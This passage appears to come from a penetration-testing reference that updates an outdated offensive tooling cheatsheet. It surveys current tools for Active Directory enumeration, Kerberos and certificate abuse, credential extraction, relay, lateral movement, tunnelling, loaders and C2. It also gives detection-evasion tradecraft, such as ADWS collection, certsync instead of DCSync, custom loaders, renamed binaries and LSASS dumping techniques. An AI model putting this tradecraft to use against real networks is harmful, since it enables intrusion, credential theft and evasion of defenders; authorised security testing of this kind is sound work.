**Project churn and forks.** Offensive tooling is maintained by a handful of people, unpaid, and when they stop the project stops. `crackmapexec` is the canonical example: upstream stopped, a community fork took over, the binary name changed, and every cheatsheet on the internet became stale in a weekend. The same pattern hit BloodHound, Ligolo, RustHound and enum4linux.

**Defensive defaults moved.** In 2020 SMB signing was off on member servers, LDAP channel binding was off everywhere, LSASS ran unprotected, and Kerberos service tickets were RC4 by default in most estates. All four of those defaults have shifted. Tools that assume the 2020 default silently fail or produce an unrelayable, uncrackable artefact.

**Signature saturation.** Any binary that has sat in a public GitHub releases page for four years is hashed, YARA'd, and behaviourally profiled. This is not a statement about "AV bypass being hard", it is a statement about pre-compiled artefacts specifically. The technique in ScareCrow is fine. The bytes ScareCrow emits are not.

**Ecosystem consolidation.** Ten single-purpose Python scripts got absorbed into four maintained suites. Where 2020 had `ticket_converter.py`, `pth-net`, `spoolsample`, `windapsearch` and a dozen others, 2026 has impacket, netexec, certipy and bloodyAD covering most of the same ground with shared authentication handling and consistent credential flags. Fewer tools, better maintained, but the flags are all different.

### How to tell whether a tool is dead before you rely on it

Check the date of the last non-README commit, not the last release. Check whether the open issue list contains a two-year-old "does not work on current Windows" thread with no maintainer reply. Check whether it pins an old impacket, because impacket's internals change and anything vendoring `impacket.smbconnection` from 2020 will not import against a current install. Check whether your distribution still packages it, since Kali dropping a package is a strong signal. And check whether the technique it implements has been folded into netexec or impacket, because if it has, the standalone version is now the unmaintained path.

### Migration table: discovery, capture and network position

| Original | Status | Use instead | What changed |
| --- | --- | --- | --- |
| `nmap -sP` | Deprecated alias, still functional | `nmap -sn` | `-sP` was renamed to `-sn` in Nmap 5.x and has been a back-compatibility alias ever since. It works, it just marks your notes as ancient. |
| `ettercap` | Effectively abandoned | `bettercap`, or targeted spoofing you write yourself | Upstream ettercap has had no meaningful release since 2020. It also GUI-crashes on modern GTK and its ARP module is unreliable at scale. |
| Mass ARP spoofing as a primary technique | Heavily degraded | Responder plus mitm6, plus coercion | Not the tool's fault: near-universal TLS means the yield from bulk interception collapsed to NTLM material you mostly cannot crack, plus service discovery. It is also the loudest thing you can do on a switched network and modern NAC and DAI catch it. |
| `Pcredz` with the `python-libpcap_0.6.4-1_amd64.deb` fix | Dead workaround | Current PCredz plus the `python3-libpcap` Cython binding from pip | That Debian package predates Python 3 entirely. PCredz itself is alive and maintained by the Responder author. |
| `net-creds`, `dsniff` | Dead | PCredz, or `tshark` field extraction | Both predate TLS ubiquity and neither parses modern SMB3 or NTLMv2 session setups correctly. |
| `nessus` discovery port list, copied by hand | Fine but superseded in practice | `naabu` for the sweep, `nmap` for the detail | The two-stage sweep pattern in the source is still correct methodology. The tooling for stage one got much faster. |

### Migration table: AD enumeration and BloodHound

| Original | Status | Use instead | What changed |
| --- | --- | --- | --- |
| `crackmapexec` / `cme` | Upstream unmaintained since 2023 | `netexec`, binary `nxc` | Community fork of the 5.x line. Binary renamed, database renamed from `cmedb` to `nxcdb`, state directory moved from `~/.cme` to `~/.nxc`. Protocol coverage expanded well beyond CME (`smb`, `ldap`, `winrm`, `wmi`, `mssql`, `rdp`, `vnc`, `ssh`, `ftp`, `nfs`). Module names mostly carried over but always confirm with `nxc smb -L`. |
| `enum4linux` (Perl) | Abandoned upstream since 2011 | `enum4linux-ng` | The Perl original shells out to `rpcclient`, `nmblookup`, `net` and `polenum` and parses their human-readable output. Samba changed that output repeatedly, so whole sections of `-a` now return nothing or lie. The `-ng` rewrite talks to the target directly through impacket and emits JSON or YAML you can actually pipe. |
| Legacy BloodHound 4.x | Superseded | BloodHound CE | Different deployment (containerised, PostgreSQL for the API layer alongside Neo4j), different UI, different collector, and importantly a different schema. See the schema notes below, this is the migration that breaks the most saved work. |
| `SharpHound.ps1` / `Invoke-BloodHound` | Removed | SharpHound CE, the compiled collector | The PowerShell wrapper is gone from CE. Collection is `SharpHound.exe --collectionmethods ...`. Legacy JSON output will not import into CE. |
| `bloodhound-python` (legacy) | Superseded | The CE-capable BloodHound.py build | Legacy output format is rejected by the CE ingest endpoint. Install the CE variant, do not mix. |
| `rusthound` | Superseded | `rusthound-ce` | Separate project maintained for the CE schema. The original emits legacy-format JSON. |
| `SilentHound` | Alive but quiet | `nxc ldap`, `ldeep`, `bloodyAD`, or an ADWS collector | The niche it filled, low-noise LDAP enumeration, is now better served either by narrow targeted LDAP queries or by moving off LDAP entirely to ADWS. |
| `PowerSploit` / PowerView | Archived upstream | `nxc ldap`, `bloodyAD`, `ldeep`, SharpHound, or Microsoft's own `Microsoft.ActiveDirectory.Management.dll` | PowerSploit was archived by its maintainers. PowerView still works and is still worth knowing because it is on every existing operator's muscle memory, but it is unmaintained, entirely signatured, and AMSI eats it unmodified. Loading Microsoft's own AD management assembly gives you `Get-ADUser` and friends without RSAT and without a third-party script. |
| `SharpView` | Unmaintained | Same replacements as PowerView | A compiled port of an archived project. Nobody is fixing it. |
| `windapsearch`, `ldapdomaindump` | Situational, still work | `ldeep`, `nxc ldap`, `bloodyAD` | Both still function for raw LDAP dumps. `ldeep` gives you a much better structured cache you can grep offline. |
| `pth-net` / pth-toolkit | Dead | `nxc`, impacket, or `net rpc` with real credentials | The patched Samba binaries that pth-toolkit shipped have not been rebuilt in a decade. Samba's own `net` has never supported pass-the-hash. Any `pth-*` command in an old note is a dead end. |

#### The BloodHound CE schema change in practice

This is the single most disruptive migration for anyone carrying old custom queries, and the source file carries about eighty of them. The specifics you need:

The `highvalue` boolean is gone. CE replaced it with asset group tagging, where Tier Zero membership is expressed through a tags property on the node rather than a bare boolean. Queries of the form `(n {highvalue:true})` return nothing in CE, silently, which is worse than erroring. Rewrite them against the tag property rather than the boolean. Do not hardcode the property name from a note, including this one: the tagging implementation has changed more than once across CE releases and the surrounding asset group model has been reworked. Ask your own instance what the property is actually called, which takes one query, and write your rewrites against the answer:

```cypher
MATCH (n:Base) WHERE n.system_tags IS NOT NULL RETURN DISTINCT keys(n) AS props, n.system_tags AS tags LIMIT 25
```

If that returns nothing, list the properties on a node you know to be Tier Zero, such as the Domain Admins group, and read the tagging property off it directly. The point is to bind your queries to what the instance has, not to what a document claimed.

Marking objects as owned is also tagging rather than a raw property write, and the UI exposes it as an asset group rather than a right-click database edit. Any query that does `SET n.highvalue = true` from the query box is writing to a schema that no longer drives the UI.

Edge coverage expanded a lot. CE added first-class ADCS edges (the `ADCSESC*` family), explicit `DCSync`, `SyncLAPSPassword`, `WriteAccountRestrictions`, `DumpSMSAPassword`, `CoerceToTGT`, and limited-rights variants of ownership edges, among others. That means the source's hand-rolled "shortest path with a giant edge list" queries are now both incomplete and unnecessary, because the built-in pathfinding covers the modern edge set and the hand-written list will miss every edge added after 2020. Delete the giant edge lists and use the built-in queries plus targeted Cypher.

Cypher is still Cypher, so the language skills carry over. The UI has a Cypher search box and saved queries, so the JSON custom-query file format from the legacy client is not how you load them any more.

Practical migration approach: do not port the eighty queries. Port the five you actually used, rewrite them against the current schema, and lean on the built-in Tier Zero pathfinding for everything else.

#### ADWS collection, the genuinely new thing

The most interesting change in AD enumeration since 2020 is not a BloodHound version, it is collecting over **Active Directory Web Services** on TCP 9389 instead of LDAP on 389/636. Defenders have spent five years building LDAP-focused detection: SACLs on directory reads, LDAP query auditing, the 1644 event, and vendor rules that fire on SharpHound-shaped LDAP filters. Almost none of that watches ADWS, which is a SOAP-over-HTTP interface that the ActiveDirectory PowerShell module has used all along, so the traffic looks like ordinary administration.

The tooling here is `SOAPHound` on the Windows side and `SoaPy` on the Linux side, both of which produce BloodHound-ingestible output from ADWS queries. Treat these as the default for collection in a monitored estate and LDAP as the fallback. Separately, `BOFHound` converts the output of LDAP-query BOFs and `pyldapsearch` logs into BloodHound JSON, which lets you build a graph out of dozens of small targeted queries executed through your C2 rather than one enormous collector run.

### Migration table: Kerberos, impacket and ticket handling

| Original | Status | Use instead | What changed |
| --- | --- | --- | --- |
| `ticket_converter.py` | Dead standalone script | impacket's `ticketConverter.py` | These are two different tools and the source uses both names for the same job, in two different sections. The underscore version was a standalone third-party script. The camelCase version is the impacket example and is the one you have installed. |
| `impacket-*` wrapper names | Distribution packaging, not upstream | Upstream names are `GetUserSPNs.py`, `secretsdump.py`, `ntlmrelayx.py` and so on | If you install impacket from git, pip, pipx or uv, you get the upstream `.py` names. The `impacket-GetUserSPNs` form is a Kali packaging convenience. Write notes in the upstream form so they work everywhere, and be aware that `impacket-secretsdump.py`, which appears in the source, is neither form and never existed. |
| `impacket-ticketer -nthash` vs `-nthashes` | Source error | `ticketer.py -nthash` for the single-key argument | `ticketer.py` takes `-nthash`. `-hashes LMHASH:NTHASH` is the pattern used by the connection-oriented scripts. They are not interchangeable and mixing them produces an argparse error, which is at least loud. |
| `kekeo` | Abandoned | Rubeus on Windows, impacket on Linux | Superseded by Rubeus for essentially everything. |
| `SpoolSample` / `printerbug.py` alone | Narrowed, not dead | `Coercer`, which enumerates and fires every known coercion method | The print spooler is disabled on a lot of domain controllers now, precisely because of this. Coercer tries MS-RPRN, MS-EFSR, MS-DFSNM, MS-FSRVP and others so you find whichever one is still exposed. |
| `Rubeus`, `Certify` | Current | Same, but build them yourself | Both are actively maintained GhostPack projects and remain the best Windows-side implementations. Certify's command surface was reworked completely, and this is not a subtle change: current Certify uses hyphenated verbs with GNU-style double-dash options, where 1.x used a single verb with slash-prefixed arguments. The verbs are `enum-cas`, `enum-templates`, `enum-pkiobjects`, `request`, `request-agent`, `request-download`, `request-renew`, `forge`, `manage-ca`, `manage-self` and `manage-template`, plus global `--out-file` and `--quiet`. So `Certify.exe find /vulnerable` is gone entirely, replaced by the `enum-*` verbs. Note also that the repository's README no longer documents usage at all, deferring to the project wiki, so `--help` on the binary you compiled is the authority |
| `PKINITtools` | Current, niche | Same, or `certipy auth` | Still the reference implementation for PKINIT TGT requests and for recovering an NT hash from a PKINIT TGT. Certipy wraps the common path. |

The important non-tool change in this area is encryption type. In 2020 you could assume Kerberoast output would be `$krb5tgs$23$`, RC4, which cracks fast. In a current estate with AES-only service accounts and `msDS-SupportedEncryptionTypes` set properly, you get `$krb5tgs$18$`, and AES tickets are roughly three orders of magnitude slower to crack because the AES string-to-key function is PBKDF2 with 4096 iterations. That single fact changes the entire economics of Kerberoasting, and it is covered in the cracking section below.

### Migration table: credential extraction

| Original | Status | Use instead | What changed |
| --- | --- | --- | --- |
| `mimikatz.exe` from a release page | Technique current, artefact dead | Build from source with renamed output, or use a BOF | Mimikatz is still maintained and still the reference implementation. The released binary is the single most-signatured file in offensive security. Also, `sekurlsa::logonpasswords` against a Credential Guard host or an LSA-protected (RunAsPPL) host returns nothing useful without a driver load or a PPL bypass, which is itself a very loud event. |
| `procdump` on LSASS | Works, extremely loud | `nanodump`, or a handle-duplication BOF, or fall back to a non-LSASS credential source | LSASS process access with `PROCESS_VM_READ` is a Sysmon 10 event, a Defender behavioural detection, and an ASR rule (`Block credential stealing from lsass.exe`) that is on by default in many estates. Nanodump exists to produce a valid minidump without the standard API pattern and to fix up the signature so the file does not look like a dump on disk. |
| `pypykatz`, `lsassy` | Current | Same | Both actively maintained. `lsassy` remains the fastest way to go from "local admin on fifty hosts" to "credential material", and it is a netexec module as well as a standalone. |
| `secretsdump.py` for large NTDS | Works, slow | `gosecretsdump` for the offline parse | Parsing a multi-gigabyte `ntds.dit` in Python takes hours. The Go reimplementation does it in minutes. Use `secretsdump.py` for the remote DRSUAPI path and the Go tool for offline `.dit` plus `SYSTEM` hive parsing. |
| Ad-hoc share pillaging with `find` and `grep` | Fine, unstructured | `Snaffler` on Windows, `manspider` from Linux, `nxc smb --spider-plus` | All three do classified, rule-driven triage of share content instead of dumping everything and reading it later. Snaffler in particular is built to be run on a domain-joined host and produce a ranked list. |
| Manual DPAPI unwrapping | Superseded | `SharpDPAPI` on Windows, `dploot` or `DonPAPI` from Linux, `hekatomb` for domain-wide | The big shift is that with the DPAPI domain backup key you decrypt every domain user's masterkeys offline, in bulk, with no further authentication to any host. That turns DPAPI from a per-host chore into a domain-wide credential harvest. |
| DCSync as the only replication path | One option among several | `secretsdump.py`, `nxc --ntds`, or `certsync` | `certsync` gets you the same hashes by minting certificates and PKINIT-authenticating as each user, which does not touch DRSUAPI at all and therefore does not fire DRSUAPI-based DCSync detection. Different telemetry entirely, which is the point. |

### Migration table: relay and coercion

| Original | Status | Use instead | What changed |
| --- | --- | --- | --- |
| SMB-to-SMB NTLM relay | Mostly dead | LDAP, LDAPS, HTTP and AD CS relay targets | SMB signing is required by default on current Windows client and server releases, and has been required on domain controllers forever. Relaying NTLM into SMB now fails on most targets. Enumerate signing first, do not assume. |
| NTLM relay to LDAP without channel binding | Increasingly dead | LDAPS with the right cross-protocol path, or AD CS HTTP endpoints | LDAP signing and channel binding enforcement moved toward on-by-default in recent Windows Server releases. Where enforced, the classic "relay to LDAP and write RBCD" chain fails at the bind. |
| `Responder` MultiRelay | Removed / superseded | `ntlmrelayx.py` | MultiRelay was folded away. `ntlmrelayx` is the maintained relay engine. |
| `PetitPotam.py` unauthenticated | Partially patched | Authenticated coercion, or the other MS-RPC coercion families via `Coercer` | The unauthenticated EFSRPC path over a null session was closed. Authenticated coercion with any domain account still works in many estates. |
| Plain LLMNR/NBT-NS poisoning as a reliable win | Degraded | mitm6 for DHCPv6/DNS, plus WPAD, plus coercion for a guaranteed authentication | LLMNR and NBT-NS are disabled by GPO in mature estates and Windows has been moving away from them. When they are present you still get NTLMv2, which you then need to either crack or relay, and both ends of that got harder. |
| `krbrelayx`, `KrbRelay`, `RemoteKrbRelay` | Current, and now the interesting direction | Same | With NTLM relay paths closing, Kerberos relaying is where the research went. Worth knowing because it survives the NTLM hardening that killed the 2020 playbook. |

### Migration table: lateral movement, pivoting and execution

| Original | Status | Use instead | What changed |
| --- | --- | --- | --- |
| `ligolo` (original) | Deprecated | `ligolo-ng` | Different project by a different author. The original is archived. Do not confuse the two, the command surfaces are unrelated. |
| `ligolo-ng` with manual `ip tuntap` setup | Outdated instructions | Built-in interface management | Recent ligolo-ng manages the tun interface and routes from inside its own console, so every tutorial telling you to run `ip tuntap add` by hand is describing an older version. The commands are `interface_create` (alias `ifcreate`), `interface_list` (aliases `iflist`, `route_list`), `interface_delete`, `route_add`, `route_del`, and `autoroute`, which derives the routes from the agent's own interfaces and is what you actually want. Session handling also renamed: it is `tunnel_start` (alias `start`), `tunnel_list` (alias `session_list`) and `tunnel_stop`, with `listener_add`, `listener_list` and `listener_stop` for the reverse port forwards |
| `chisel` | Current | Same | Still maintained, still the most portable fallback, still trivially detected by name so rename the binary. |
| `sshuttle` | Current | Same | Unchanged and still excellent when you have SSH and Python on the pivot. |
| `Evil-WinRM` HTTPS on port 5956 | Source error | 5986 | WinRM is 5985 plaintext and 5986 over TLS. There is no 5956. |
| `SCShell` | Current, niche | Same | Still works, still valuable because it changes an existing service's `ImagePath` rather than creating a service and dropping a binary, which is a meaningfully quieter artefact set. |
| `JuicyPotato` | Dead on anything modern | `PrintSpoofer`, `GodPotato`, `EfsPotato`, or a SeImpersonate abuse of your own | JuicyPotato relied on a local DCOM activation path that Microsoft closed in Windows 10 1809 and Server 2019. It has not worked on a supported OS in years. |
| `RottenPotato` | Dead | As above | Same lineage, same fate, even older. |
| `SweetPotato`, `PrintSpoofer` | Situational | Check spooler state first | PrintSpoofer needs the print spooler running, and post-PrintNightmare a lot of servers have it disabled. |
| `SharpSCCM` era SCCM work | Expanded enormously | `SharpSCCM` plus `sccmhunter`, against the Misconfiguration Manager technique catalogue | In 2020 SCCM abuse was network access account credential recovery. It is now a structured attack surface with catalogued credential, elevation, execution and takeover paths, and SCCM site takeover is frequently a faster route to domain compromise than anything in AD itself. |

### Migration table: payload generation, loaders and C2

| Original | Status | Use instead | What changed |
| --- | --- | --- | --- |
| `ScareCrow` | Technique-relevant, output dead | Roll your own loader, or a maintained framework's loader with a custom template | Development effectively stopped after 2022. Its loader shape, its fake-signing behaviour, its DLL-sideloading templates and its export naming are all in every vendor's signature set. The ideas (unhooking, fake Authenticode, sideloading) remain valid; the generator's output is a known-bad file. |
| `Limelighter` | Works, buys you little | Nothing, or accept an unsigned binary | Generating a fake code-signing certificate still works mechanically, but an untrusted signer does not help against WDAC, does not help against reputation-based SmartScreen, and an invalid signature chain on a binary claiming to be Microsoft is itself a detection opportunity. It was more useful in 2020 than it is now. |
| `Mangle` | Works, marginal | Same, understood for what it is | Strips Go build artefacts, adjusts compile timestamps and pads file size. Useful hygiene on Go implants. Not a bypass. |
| `SysWhispers` / `SysWhispers2` | Superseded by its own successor | `SysWhispers3`, and understand indirect syscalls | Direct syscall instructions executed from your own module, rather than from inside `ntdll`, are now themselves the indicator: the return address is wrong. SysWhispers3 added modes that jump into a real syscall instruction inside `ntdll` so the call originates where it should. If your loader still does classic direct syscalls, that is the 2020 pattern. |
| `Salsa-tools` | Dead | Any current .NET tradecraft plus a working AMSI approach | 2019-era .NET reverse shell with a bundled AMSI bypass. Every string in it is signatured. |
| `Wraith` / AQUARMOURY | Abandoned | Read it for the techniques | The suite is not maintained. Module stomping and the other primitives it demonstrates are still worth understanding and reimplementing. |
| `Donut` | Current | Same, plus `sRDI` for reflective DLLs | Still the workhorse for turning a PE or .NET assembly into position-independent shellcode. Note that donut's own loader stub is recognised, so what you wrap it in matters more than donut itself. Also note the source's `donut -a 2 -f 7 -o payload.bin` is confused: `-f 7` selects C# source output, not a raw `.bin`. |
| `msfvenom` payloads | Alive, detected | Anything else, for anything with EDR | msfvenom is fine for a quick shell on an unprotected appliance or a CTF. Every stock msfvenom stub, encoder and stager is detected. The encoders in particular (`shikata_ga_nai` and friends) are decoder-stub signatures, not evasion. |
| The AMSI bypass one-liner in the source | Dead | Understand the primitive, generate your own | That specific obfuscated `AmsiUtils.amsiInitFailed` reflection payload has been a signature for years, string-scrambling and all. The underlying primitive (flip the init-failed flag, or patch `AmsiScanBuffer`) still works; that exact text does not. |
| `Covenant` | Development stopped | Sliver, Mythic, Havoc, or commercial | Unmaintained since roughly 2021, .NET-only, and its default HTTP profile and Grunt stager are thoroughly signatured. |
| `PowerShell Empire` (original) | Forked | The BC Security Empire line | The original project was retired and picked up by a different team. If you use Empire, use the maintained fork. |
| `SILENTTRINITY` | Abandoned | Sliver or Mythic | Interesting IronPython idea, no longer maintained. |
| `Cobalt Strike` 2020 defaults | Alive, but defaults are lethal | Current release with a custom malleable profile, UDRL, and sleep mask | Stock Beacon with a default profile is detected instantly. Modern CS usage is defined by what you replace: user-defined reflective loader, custom profile, post-ex kit configuration. |
| `Sliver`, `Havoc`, `Mythic` | Current | Same | Sliver is the default free choice for cross-platform implants; Havoc's Demon is capable but development has been intermittent; Mythic is a framework rather than an implant and is the right answer when you want to run several different agents behind one interface. All three have detected default profiles and support custom builds for exactly that reason. |
| `Hack-Tools` browser extension | Alive, trivial | Nothing, write your own notes | This was the entirety of the source's "useful tools" section. It generates reverse shell one-liners. That is not tooling, and every one-liner it emits is a signature. |

### Capability inventory

Organise your toolbox by what you need done, because capabilities are stable and tool names are not. For each capability below, the question to ask is "what is the mechanism, and which currently-maintained implementation exposes it".

#### Host and port discovery

| Tool | What distinguishes it |
| --- | --- |
| `nmap` | The reference. Only tool with trustworthy service and version detection, NSE, and OS fingerprinting. Slow at scale, which is why you stage. |
| `masscan` | Asynchronous, stateless, arbitrarily fast, will melt a fragile network. Use for single-port sweeps of very large ranges. No service detection worth the name. |
| `naabu` | Middle ground. Fast SYN or CONNECT sweep with sane defaults, integrates cleanly into a pipe with the rest of the ProjectDiscovery suite, can hand results straight to `nmap` for the detail pass. |
| `rustscan` | Fast port discovery that then invokes `nmap` for you. Convenient, but the same result as staging by hand. |
| `nxc` protocol probes | When you already have a host list, `nxc smb $TARGETS` tells you OS build, domain, SMB signing state and null-session behaviour in one pass, which is more actionable than a port list. |
| `dnsx` plus reverse lookups | Reverse-DNS sweeping an internal range often names the estate better than any port scan: `SQL01`, `SCCM-PRI`, `DC02`. Cheap and very quiet. |

The staged methodology in the source is correct and worth keeping: ICMP sweep, then a small high-value TCP port list across everything, then a wide port list against the hosts that answered, then version detection only where it matters. Do not run `-p-` against a /16 as a first move.

#### LDAP and AD enumeration

| Tool | What distinguishes it |
| --- | --- |
| `nxc ldap` | Best "one command, useful answer" tool. Modules cover password policy, machine account quota, LAPS, gMSA, AD CS presence, GPP passwords, delegation and description-field secrets. Also the fastest way to check whether LDAP signing and channel binding are enforced. |
| `bloodyAD` | The write-oriented tool. Purpose-built for the ACL abuse primitives: set SPNs, add to groups, write `msDS-KeyCredentialLink`, set RBCD, change ownership, reset passwords. Where PowerView was read-plus-write on Windows, bloodyAD is read-plus-write from Linux. |
| `ldeep` | Structured, cacheable dump of the whole directory into files you can grep offline. When you want to answer twenty questions without twenty LDAP queries, dump once with ldeep and work locally. |
| SharpHound CE / BloodHound.py CE / RustHound-CE | Graph collection. Choose by where you are: compiled collector on a Windows foothold, Python from your own box with credentials, Rust when you want speed and a single static binary. |
| `SOAPHound` / `SoaPy` | Same graph data over ADWS instead of LDAP. The opsec choice. |
| `BOFHound` | Turns many small in-C2 LDAP queries into a graph. The choice when a full collector run is too much noise. |
| Microsoft's AD PowerShell module | Signed by Microsoft, present or trivially loadable, and produces LDAP traffic indistinguishable from administration. The least suspicious enumeration available on a Windows foothold. |
| `enum4linux-ng`, `rpcclient`, `smbclient` | Pre-credential and null-session work: RID cycling, share listing, password policy, domain SID recovery. |
| `windapsearch`, `ldapdomaindump` | Still fine for quick raw dumps if you already know them. |

#### Kerberos operations

| Tool | What distinguishes it |
| --- | --- |
| `Rubeus` | The Windows-side Swiss army knife: `asktgt`, `asktgs`, `s4u`, `kerberoast`, `asreproast`, `tgtdeleg`, `monitor`, `harvest`, `ptt`, `renew`, `describe`. Nothing on Linux matches its breadth for in-session ticket work, particularly ticket harvesting and delegation abuse. |
| impacket `getTGT.py`, `getST.py`, `ticketer.py`, `describeTicket.py`, `ticketConverter.py` | The Linux equivalents, one script per operation. `describeTicket.py` is underused and tells you exactly what is in a ticket, including the PAC, which saves a lot of guessing. |
| `GetUserSPNs.py`, `GetNPUsers.py` | Kerberoast and AS-REP roast from Linux. Note `-request-user` for targeted roasting rather than pulling everything, and the encryption type you get back. |
| `kerbrute` | User enumeration and password spraying against the KDC. Fast, and pre-authentication failures for a nonexistent user look different from a wrong password, which is the whole enumeration primitive. |
| `nxc` Kerberos support | `-k` / `--use-kcache` across every protocol, which means one TGT drives SMB, LDAP, WinRM and MSSQL access without re-authenticating. |
| `PKINITtools` | PKINIT TGT requests, and recovering an NT hash from a PKINIT-obtained TGT without cracking anything. |
| `nanorobeus` | Kerberos ticket operations as a BOF, so no new process and no CLR load. |

Kerberos needs FQDNs and working forward and reverse DNS. Almost every "it worked with an IP but not a hostname" Kerberos failure is a name resolution or SPN lookup problem, not a credential problem. Point your resolver at `$DC` and use FQDNs throughout.

#### Certificate services

| Tool | What distinguishes it |
| --- | --- |
| `certipy` | The Linux-side end-to-end flow: `find` for the enumeration and vulnerability assessment, `req` to request, `auth` to turn a PFX into a TGT or NT hash, `shadow` for key credential abuse, `ca` and `template` for the ESC4 and ESC7 manipulations, `relay` for the AD CS relay path. If you are operating from Linux, this is the tool. |
| `Certify` | The Windows-side equivalent, GhostPack, actively maintained, and the right choice when you are already in-session and would rather not tunnel LDAP and RPC back out. Command surface changed in the 2.0 rewrite. |
| `ForgeCert` | Forging certificates from a stolen CA private key. |
| `certsync` | Domain hash dump via certificates rather than DRSUAPI. Different detection surface from DCSync. |
| `pywhisker` / `Whisker` | Shadow credentials, writing `msDS-KeyCredentialLink`. The cleanest way to convert an ACL write into authentication material, and it survives password rotation of the target. |
| `certutil`, `certsrv` web pages | Native. Useful for confirming what you found and for the manual path when tooling is blocked. |

The thing that changed here is **KB5014754 strong certificate mapping**. Certificates issued before the enforcement change, or that lack the SID security extension, may not map to an account any more depending on the domain controller's enforcement mode. An ESC1-style attack that worked in 2022 can produce a perfectly valid certificate that then fails to authenticate. Read the failure carefully: a mapping rejection is not the same as a template misconfiguration going away.

#### Credential extraction

| Tool | What distinguishes it |
| --- | --- |
| `secretsdump.py` | Remote SAM, LSA secrets, cached domain credentials and NTDS over DRSUAPI. The default first move with local admin or DCSync rights. |
| `gosecretsdump` | Offline `ntds.dit` parsing at usable speed. |
| `nxc --sam --lsa --ntds --dpapi` | The same capabilities across many hosts at once, with results in the nxc database. |
| `lsassy` | Remote LSASS dump and parse across a host list, minimal footprint on disk. |
| `nanodump` | LSASS dumping as a BOF with configurable techniques and signature-invalidated output. The choice when Sysmon 10 and ASR are in play. |
| `pypykatz` | Offline parsing of LSASS dumps and registry hives. Pure Python, so it runs anywhere. |
| `mimikatz` | Still the reference implementation and still the only thing that does some of the more exotic operations. Build from source, rename everything. |
| `SharpDPAPI` / `SharpChrome` | Windows-side DPAPI, browser credentials, credential vaults, RDP saved credentials. |
| `dploot` / `DonPAPI` / `hekatomb` | The same, driven remotely from Linux, and domain-wide once you hold the DPAPI backup key. |
| `Snaffler` / `manspider` | Credentials that are not hashes: config files, scripts, connection strings, private keys sitting on shares. Consistently a higher-yield source than LSASS in a hardened estate. |

The strategic point: in a 2020 estate you dumped LSASS. In a 2026 estate with Credential Guard, RunAsPPL, and ASR credential-theft rules, the reliable credential sources are shares, DPAPI, service accounts with weak passwords, backup software, SCCM, and certificates. LSASS is the loud option that increasingly returns nothing.

#### Relay and coercion

| Tool | What distinguishes it |
| --- | --- |
| `Responder` | Answers LLMNR, NBT-NS, mDNS, WPAD and more. Still run it, still occasionally hands you a credential in the first ten minutes. Use analyse mode first to see what is actually broadcasting. |
| `mitm6` | DHCPv6 plus rogue DNS. Windows prefers IPv6, and most estates manage IPv4 carefully and IPv6 not at all. Frequently the highest-yield poisoning available. |
| `ntlmrelayx.py` | The relay engine. Target selection is the whole game now: LDAP and LDAPS for RBCD and shadow credentials, HTTP AD CS endpoints for certificate issuance, SMB only where signing is off. |
| `Coercer` | Fires every known coercion RPC method so you find the one that is still exposed. |
| `krbrelayx`, `KrbRelay`, `RemoteKrbRelay` | Kerberos relaying, which is where this area is heading as NTLM paths close. |
| `certipy relay` | The AD CS relay flow specifically, with the certificate handling built in. |

Always establish the defensive posture before building a relay chain: SMB signing per target, LDAP signing and channel binding on the domain controllers, whether the AD CS web enrolment endpoints exist and whether they require HTTPS with extended protection. `nxc` answers most of this in one pass and saves you an hour of failed relays.

#### Lateral execution

| Tool | What distinguishes it |
| --- | --- |
| `nxc smb -x` / `-X` | Fastest path from credential to command across many hosts. Selectable execution method (`smbexec`, `wmiexec`, `atexec`, `mmcexec`), which matters because each leaves different artefacts. |
| impacket `psexec.py` | Service creation plus a dropped binary. The loudest option and the most reliable. Event 7045 every time. |
| impacket `smbexec.py` | Service creation without dropping a PE, output via a temporary file on `ADMIN$`. Still a service event. |
| impacket `wmiexec.py` | WMI process creation, no service, no dropped binary in the classic sense. Quieter, and the default choice when you just need a command. |
| impacket `atexec.py` | Scheduled task. Different event set again, useful when service creation is monitored. |
| impacket `dcomexec.py` | DCOM object method invocation. Useful when the above are blocked. |
| `evil-winrm` | Interactive WinRM shell with script loading, AMSI handling, upload and download, and PTH support. 5985 or 5986. |
| `SCShell` | Existing-service `ImagePath` modification. No service creation event, no binary dropped. |
| `RunasCs` | Running as another user from a non-interactive context, which plain `runas` cannot do. |
| WinRS, `Invoke-Command`, `Enter-PSSession` | Native. Signed, expected, and often the quietest thing you can do if the account is legitimately allowed. |
| `SharpSCCM`, `sccmhunter` | Execution via the SCCM infrastructure, which is a trust relationship most defenders do not monitor as lateral movement. |

#### Tunnelling and pivoting

| Tool | What distinguishes it |
| --- | --- |
| `ligolo-ng` | The current default. Creates a tun interface on your side, so you route to target subnets natively without proxychains and without SOCKS-unaware tools breaking. Handles multiple concurrent agents. |
| `chisel` | Single static Go binary, client and server, TCP and SOCKS over HTTP or WebSocket. The portable fallback that works when nothing else does. Rename it. |
| `sshuttle` | Transparent routing over an existing SSH session. Zero extra tooling on the target beyond SSH and Python. |
| OpenSSH itself | `-D` dynamic SOCKS, `-L` local forward, `-R` remote forward, `ProxyJump` for chaining. Present everywhere, entirely legitimate-looking, and underused. |
| `socat`, `netsh interface portproxy` | Single-port relays when you need one thing forwarded and nothing more. The `netsh portproxy` route is native on Windows and survives reboots, which is also why you must remember to remove it. |
| C2-native SOCKS | Sliver's `socks5`, Cobalt Strike's `socks`, Mythic agents' equivalents. No extra binary, no extra process, traffic already inside your existing channel. Always the first thing to try. |
| `proxychains-ng` | Client-side wrapper for SOCKS-unaware tools. Works, but breaks on anything using raw sockets or UDP, mangles timeouts, and is why a tun-based approach like ligolo-ng is preferable. |

#### Payload generation

| Tool | What distinguishes it |
| --- | --- |
| `donut` | PE, .NET assembly, VBS or JS to position-independent shellcode. The standard front half of a loader chain. |
| `sRDI` | Reflective DLL loading shellcode from an ordinary DLL. The other standard front half. |
| `Freeze` / `Freeze.rs` | Loader generation with unhooking and suspended-process techniques built in. Better maintained than ScareCrow was, still a public generator whose output is a known shape. |
| `SysWhispers3` | Syscall stub generation, including indirect syscall modes. A component, not a payload. |
| `msfvenom` | Quick and universally detected. Fine for appliances and lab work. |
| Your own loader | The only durable answer. Anything public that generates a complete artefact is, by the time you read about it, in a signature set. |
| C2-native generation | Sliver profiles, Cobalt Strike artefact kit and UDRL, Mythic payload types. Configurable enough to be worth customising rather than replacing. |

#### C2 frameworks

| Framework | What distinguishes it |
| --- | --- |
| Sliver | Free, Go, cross-platform implants, mTLS, WireGuard, HTTP(S) and DNS transports, BOF support via extensions and the armory, external builder support so you can supply your own stager. The default free choice. |
| Mythic | A framework that hosts other people's agents in containers rather than an implant. Right answer when you want a .NET agent, a Go agent for macOS and a Linux agent behind one operator interface. |
